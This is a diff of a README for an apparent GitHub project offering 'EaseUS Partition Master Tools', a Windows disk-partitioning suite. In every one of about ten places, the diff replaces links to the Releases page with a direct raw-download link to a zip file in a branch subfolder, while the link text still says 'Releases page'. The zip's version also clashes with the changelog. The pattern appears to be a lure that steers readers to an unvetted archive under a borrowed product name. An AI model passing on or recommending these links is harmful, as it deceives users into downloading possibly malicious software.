@@ -1,4 +1,4 @@
-https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 # EaseUS Partition Master Tools: Resize, Merge, Split, Convert, Migrate Effortlessly
 
@@ -14,7 +14,7 @@ A practical suite for Windows users who manage disks and partitions. This projec
 - Convert between partition styles (MBR and GPT) and between file systems where applicable.
 - Migrate OS or data to another drive with minimal downtime.
 
-This README follows a practical approach. It explains what the project does, how to use it, and how to get the best results from its features. If you want to try the latest release, visit the Releases page. Releases: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+This README follows a practical approach. It explains what the project does, how to use it, and how to get the best results from its features. If you want to try the latest release, visit the Releases page. Releases: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -99,7 +99,7 @@ The goal is not to surprise you with abstract features. It is to give you practi
 - For most tasks, changes are previewed before applying. You review the proposed results and confirm to proceed.
 - After the operation, the tool validates the outcome and reports results. If any issues occur, it offers guidance on next steps.
 
-If you want to try the latest release, visit the Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+If you want to try the latest release, visit the Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -152,7 +152,7 @@ This section walks you through a typical workflow: preparing, installing, and pe
   - Always confirm boot configurations after migration to ensure the system starts as expected.
 
 Downloads:
-Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -205,7 +205,7 @@ Best practices during operations
 - If you are unsure, seek guidance from more experienced users or the support channels listed in this repository.
 
 Downloads:
-Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -231,7 +231,7 @@ Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/release
   - Use a repair or fix boot option if needed to restore bootability.
   - Double-check that the OS and its installed applications are functional on the new drive.
 
-If you need more details about any particular issue, the community or maintainers can help you troubleshoot with specific logs and screenshots. The Releases page is the best place to look for updates and known issues. Releases: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+If you need more details about any particular issue, the community or maintainers can help you troubleshoot with specific logs and screenshots. The Releases page is the best place to look for updates and known issues. Releases: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -250,7 +250,7 @@ If you need more details about any particular issue, the community or maintainer
   - A: It can manage partitions on external drives, provided the drive is accessible and not in use by the system.
 
 - Q: Where can I get the latest release?
-  - A: The Releases page is the best source for the latest installers and updates. Releases: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+  - A: The Releases page is the best source for the latest installers and updates. Releases: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -280,7 +280,7 @@ If you need more details about any particular issue, the community or maintainer
 - Enhanced migration paths for larger disks and multi-OS setups.
 - More robust handling of edge cases, such as complex boot configurations.
 
-If you want to stay informed about updates, check the Releases page regularly: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+If you want to stay informed about updates, check the Releases page regularly: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -294,7 +294,7 @@ If you want to stay informed about updates, check the Releases page regularly: h
 Community involvement helps improve reliability and adds new capabilities. If you have ideas for improvements, share them in the project’s discussion channels or issues.
 
 Downloads:
-Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -314,7 +314,7 @@ This project is released under a permissive license that encourages use, modific
 - If you can attach screenshots or logs, that helps with faster diagnosis.
 
 Downloads:
-Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
@@ -341,7 +341,7 @@ Version 2.0.0
 - Updated migration workflows with better handling of edge cases.
 
 Releases:
-Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/releases
+Releases page: https://github.com/k1ntar-0/easeus-partition-master-tools/raw/refs/heads/main/scythesmith/partition_easeus_master_tools_1.0.zip
 
 ---
 
